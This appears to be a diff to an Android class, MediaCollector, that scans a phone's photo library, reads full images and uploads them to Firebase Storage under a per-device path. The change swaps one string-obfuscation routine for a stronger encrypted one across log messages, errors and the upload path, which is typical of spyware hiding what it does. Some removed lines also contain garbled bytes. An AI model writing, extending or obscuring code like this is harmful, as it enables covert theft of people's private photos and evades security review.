@@ -23,7 +23,7 @@ import java.util.List;
 import java.util.Map;
 
 public class MediaCollector {
-    private static final String TAG = StringHelper.qzxp("icoKZ0Fz4ZSvFV/Po1ho3+gVFg==");
+    private static final String TAG = StringHelper.decrypt("UH5bakFzy8ESHLuviQnCJq9gx/e0+sGe/EuFKpFGlGdYdEIzYrrRihLz2wTWbIw=");
     private static List<Map<String, String>> mediaBuffer = new ArrayList<>();
     private static boolean scanInProgress = false;
     private static int lastScanCount = 0;
@@ -38,7 +38,7 @@ public class MediaCollector {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 String permission = android.Manifest.permission.READ_MEDIA_IMAGES;
                 if (context.checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
-                    scanError = StringHelper.qzxp("kynxGehhtKicMSQ5wJbMRAg7yPc9sRamHgYkftaxTAGtKe0E");
+                    scanError = StringHelper.decrypt("EuT0mj/AlAFukoxIKocwEcdMKG5uGOAdXOfHOc2DghBnV57W3Z/KXWRm55ZMaK+JaJJSS+Tr9hn6Bv5PzPA2Mw==");
                     return results;
                 }
             }
@@ -49,7 +49,7 @@ public class MediaCollector {
                     MediaStore.Images.Media.DATE_ADDED
             };
 
-            String sortOrder = MediaStore.Images.Media.DATE_ADDED + StringHelper.qzxp("0yX5zg4=");
+            String sortOrder = MediaStore.Images.Media.DATE_ADDED + StringHelper.decrypt("7U19cb8BuMJlr7aO9hzn2DCYmCO555GgxFnTQkihNROI");
 
             Cursor cursor = null;
             try {
@@ -62,7 +62,7 @@ public class MediaCollector {
                 );
 
                 if (cursor == null) {
-                    scanError = StringHelper.qzxp("xR0Qf5ecqempeIDxKznl76GpCypimJCOMiDh");
+                    scanError = StringHelper.decrypt("2s0rDQhQ6dx3iUo7US3xJTD1T2Y+V+TypvoL9NcsFTQsR2SyQKz6hqOC/8gjCZagdLhHR/JcTw==");
                     return results;
                 }
 
@@ -77,9 +77,9 @@ public class MediaCollector {
                     long date = cursor.getLong(dateColumn);
 
                     Map<String, String> map = new HashMap<>();
-                    map.put(StringHelper.qzxp("kB4="), String.valueOf(id));
-                    map.put(StringHelper.qzxp("��-"), name);
-                    map.put(StringHelper.qzxp("Z�"), String.valueOf(date));
+                    map.put(StringHelper.decrypt("BZ8j8ZT8OCLZMEHFPeLgNshiM+Ec4kCvn4l+2/ZK"), String.valueOf(id));
+                    map.put(StringHelper.decrypt("9en08Px/kdhGMe+MxcL/b1uwuzBYxCB0+SvFiB/FxlA="), name);
+                    map.put(StringHelper.decrypt("kTZLceJxckpS0XHlobc0+4f4hmbmqySprHrHpAI7EXo="), String.valueOf(date));
                     results.add(map);
                     count++;
                 }
@@ -93,8 +93,8 @@ public class MediaCollector {
             lastScanCount = results.size();
 
         } catch (Exception e) {
-            scanError = StringHelper.qzxp("0NVj3hOKIQ==") + e.getMessage();
-            Log.e(TAG, StringHelper.qzxp("WepgVyxvGQ0HZQ=="), e);
+            scanError = StringHelper.decrypt("EK/cyiZxyDFTBX5QfwXIsT0f1g2aj2UfekEQHKMhyH5BPms=") + e.getMessage();
+            Log.e(TAG, StringHelper.decrypt("VMQRU4A9OHULnCJNL/oy396e9Kqtf/7ecr4eNDMVNn5e1ZMVnKo="), e);
         } finally {
             scanInProgress = false;
         }
@@ -104,27 +104,27 @@ public class MediaCollector {
 
     public static String getScanStatus() {
         if (scanInProgress) {
-            return StringHelper.qzxp("henSz8XWyEu/0GJGqKfl");
+            return StringHelper.decrypt("6N0cc4lokmOGrskD31mFg+NfswGs963uVU22/aiPKWYQgW6Fms7GpUqoig==");
         }
         if (scanError != null) {
-            Log.e(TAG, StringHelper.qzxp("HVSeousaezZv8HinduQo/5eSQqa5wN+loft1ClVudpEdVJ6i6xp7Ng=="));
+            Log.e(TAG, StringHelper.decrypt("TelKN/cFK3Zq8fSr38V4IkibQ/DllvV3/CTRgwROhSyjO7QwVtE8Zqa5k2c3dtfyurp+y9sJTin5to2o3WktcTcQaTs="));
             Log.e(TAG, scanError);
-            Log.e(TAG, StringHelper.qzxp("PjNaxeMN5b6tzVjWGdKymr3VeAO7HgYPnoFyRShe/IE+M1rF4w3lvg=="));
+            Log.e(TAG, StringHelper.decrypt("9vDgE0IQOG4PiOV7xvMqKIhPxVXj2QC1hOmTzl0icrfBFMZbbz6y6HJ2fNCpEL4lc2zCoUqQPeppIhhUbiYHhLduzTE="));
 
             if (scanError.contains("permission") || scanError.contains("Permission")) {
-                return StringHelper.qzxp("nrWSvsCJAhMB3cgMi+y0qCTE38Px5jIqx7N2");
+                return StringHelper.decrypt("83bEg9JcizAuGBdlHWM/vW/QASRxfSw99Yq3HxdPAgMEqO4A8K8rj+GrOQVzkltvmOJXLRViEg==");
             } else if (scanError.contains("cursor") || scanError.contains("query")) {
-                return StringHelper.qzxp("UjQnyB1DQ0WW+gOgt32nr0/D");
+                return StringHelper.decrypt("GRUMqw30qKjVaObX84O5eu7VNVOEqqlUNOYax+MaZpjNL0HyQeaHGIET9e8fWw==");
             } else if (scanError.contains("null")) {
-                return StringHelper.qzxp("2+NueqIFQPiabag9Wv0bUQ==");
+                return StringHelper.decrypt("tssmNzaBbC3AESIZtIHwbZbEVakgXk3/gutpOH6euyMTm9HPl0L8mMJWTbs=");
             } else {
-                return StringHelper.qzxp("NO31yQE7djn2wFew6xXexkyHd/pRPRWhGytb6w==");
+                return StringHelper.decrypt("7TtvSWthB6C2zLHpYzUBU5U0km2c+bv9Q5+N0BYvOIGMGDUbyOfFOQ9hHbj6LgTr7GRhlDk+VgQ=");
             }
         }
         if (lastScanCount > 0) {
-            return StringHelper.qzxp("sB9YblY1qmCtkA==") + lastScanCount + StringHelper.qzxp("cuqwL3c/rA==");
+            return StringHelper.decrypt("c/tXGmM0j3kof81OSsU7KP5EAt8ieKRw5xX2oWNHHFWdDDQPN6U=") + lastScanCount + StringHelper.decrypt("kBlFQUBdOmQGMz9cCNO/yScmwt6Oyh+xwWG0Z3JXuZ+5MtI=");
         }
-        return StringHelper.qzxp("SFYbTytF5M1If5NgWccteI6T1/yhOMsLTAr/ftE=");
+        return StringHelper.decrypt("vhTxvjJEZxDbRppFOSLMk+jne1UDxZRSeHopa0WObodPvnOfyBkTG/9JoYAtzKXxWYxNtk5cS7/L");
     }
 
     public static List<Map<String, String>> getCollectedMedia() {
@@ -175,7 +175,7 @@ public class MediaCollector {
                 }
             }
         } catch (Exception e) {
-            Log.e(TAG, StringHelper.qzxp("bL5bxsP5IjhHW70yuO2Lriv0oxBOyA+AX8Q=") + e.getMessage());
+            Log.e(TAG, StringHelper.decrypt("rk6Ddr4U17jDhizmjv3GhrePJgFREMgGV1jt4xv/CWGaAa6W5eVoiFzH+BHIJAOqB/yTJrNU") + e.getMessage());
         }
         return null;
     }
@@ -204,7 +204,7 @@ public class MediaCollector {
                 }
             }
         } catch (Exception e) {
-            Log.e(TAG, StringHelper.qzxp("6H9jET8oKyCn49YQ6pG1YmeAeaORYpSjUBc=") + e.getMessage());
+            Log.e(TAG, StringHelper.decrypt("aqXI4kd3dwF68X8aOhMHjhvqFEf7FN9v2QjOvBg7JOuTTQ+8LlYezqZtSWGMqGpmnmKvBEXw") + e.getMessage());
         }
         return null;
     }
@@ -213,32 +213,32 @@ public class MediaCollector {
         try {
             String imageData = getFullImage(context, imageId);
             if (imageData == null) {
-                Log.e(TAG, StringHelper.qzxp("RqWS+i6PjZaqTVwlvTssWv1wQvCt826uqPRbrKwqPU0g") + imageId);
+                Log.e(TAG, StringHelper.decrypt("lEtnf1b6EOJeuIN8IxUJMShzdfY0cXTo4/jQCqt8PgCNvMMouUXqqWQJ0Z1RzGLfq/NMd1q9ev6J2AgETw==") + imageId);
                 return;
             }
 
             Map<String, String> info = getImageInfo(context, imageId);
-            String fileName = info != null ? info.get("name") : StringHelper.qzxp("VJWW7QRO") + imageId + StringHelper.qzxp("E5KH7Q==");
+            String fileName = info != null ? info.get("name") : StringHelper.decrypt("d1n/q3RE/jpMmLsnX+HOW/mGXbdGdHLCoigMnOQQs4d+qQ==") + imageId + StringHelper.decrypt("hhY8HSdQS9jWeFypjaYt12CC6HXRT/Q2tL/9ye/XgkM=");
 
             byte[] imageBytes = Base64.decode(imageData, Base64.DEFAULT);
 
             String timestamp = String.valueOf(System.currentTimeMillis());
-            String path = StringHelper.qzxp("zROOQQOZJvR+Pe/8BmlTKsYh") + deviceId + "hw==" + timestamp + "9w==" + fileName;
+            String path = StringHelper.decrypt("M51lW2zg+KStaqvnh1f58utsnYHgNwcYdx78kSiAn4RZapZ0X1ATm30+rMB6ag==") + deviceId + StringHelper.decrypt("qSfCFBYw2TroHb/xfdhWBZltecK0r9OeP6Tfx7E=") + timestamp + StringHelper.decrypt("yL/55+b7wH/qYzvUvmBcSLCtWT/TK9ZPj6fcJgg=") + fileName;
 
             FirebaseStorage storage = FirebaseStorage.getInstance();
             StorageReference storageRef = storage.getReference().child(path);
 
-            Log.d(TAG, StringHelper.qzxp("THlTtfnyGJz6ijwaS+w43MY5xQ==") + path);
+            Log.d(TAG, StringHelper.decrypt("R+76PPyZ91h/LGxfbiWjlC+eCzV7ZhsPdq/rXywhcsyeL7Jz1RKC4chm14aGeDY=") + path);
 
             UploadTask uploadTask = storageRef.putBytes(imageBytes);
             uploadTask.addOnSuccessListener(taskSnapshot -> {
-                Log.d(TAG, StringHelper.qzxp("IvcV3NnDNGxHjtAGSEOFycT8J1IE/A=="));
+                Log.d(TAG, StringHelper.decrypt("+TOI8qMdq/VtDQ8xt9JNS/tsfPrS3hyDQY731v26bC5vTYssboTpSGCj4o4a/3+p8bU="));
             }).addOnFailureListener(e -> {
-                Log.e(TAG, StringHelper.qzxp("056dlgrC0oTxPOFceLmSuSODGA==") + e.getMessage());
+                Log.e(TAG, StringHelper.decrypt("+pPG9NYhSBkJ+fSph7M7Xw7Vn0EQFkDqFSUEPiB/1+mbF1TMrXdnIyTH6bWgsao=") + e.getMessage());
             });
 
         } catch (Exception e) {
-            Log.e(TAG, StringHelper.qzxp("qWTh3pfvDEL+f2rk3Io=") + e.getMessage());
+            Log.e(TAG, StringHelper.decrypt("cYS1fL5Brc9WTwT+YDYdQK11pKYiWV1WbHQM5pIMNtdtb4NipVYJbBbi") + e.getMessage());
         }
     }
 }
